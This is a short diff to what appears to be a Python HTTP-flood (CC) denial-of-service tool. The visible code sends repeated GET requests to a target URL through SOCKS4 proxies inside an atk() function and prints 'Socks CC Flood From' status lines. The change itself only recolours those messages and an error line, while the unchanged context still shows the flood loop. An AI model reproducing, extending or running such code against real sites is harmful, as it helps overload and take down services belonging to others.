@@ -211,14 +211,13 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print(Fore.BLUE + "[+] Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
+						print(Fore.GREEN + "[+] Socks CC Flood From ~[ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
 					s.close
 				except:
 					s.close()
 			except:
 				s.close()
-				print("[!] Can't Connet To This Socks4")
-
+				print(Fore.RED + "[!] Can't Connet To This Socks4" + Fore.WHITE)
 
 if __name__ == "__main__":
 	main()
